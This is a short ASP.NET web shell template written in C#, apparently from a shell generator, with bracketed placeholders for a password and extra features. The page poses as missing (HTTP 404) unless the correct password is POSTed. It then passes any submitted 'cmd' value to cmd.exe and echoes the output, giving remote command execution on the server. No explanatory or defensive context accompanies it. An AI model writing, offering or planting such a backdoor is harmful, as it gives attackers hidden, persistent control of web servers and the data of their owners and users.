<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%
if(Request.Form["[password_field]"]!="[password]"){
  Response.StatusCode=404;Response.End();return;
}
if(Request.Form["cmd"]!=null){
  ProcessStartInfo si=new ProcessStartInfo("cmd.exe","/c "+Request.Form["cmd"]);
  si.RedirectStandardOutput=true;si.RedirectStandardError=true;si.UseShellExecute=false;
  Process p=Process.Start(si);
  Response.Write("<pre>"+Server.HtmlEncode(p.StandardOutput.ReadToEnd())+Server.HtmlEncode(p.StandardError.ReadToEnd())+"</pre>");
}
[features]
%>
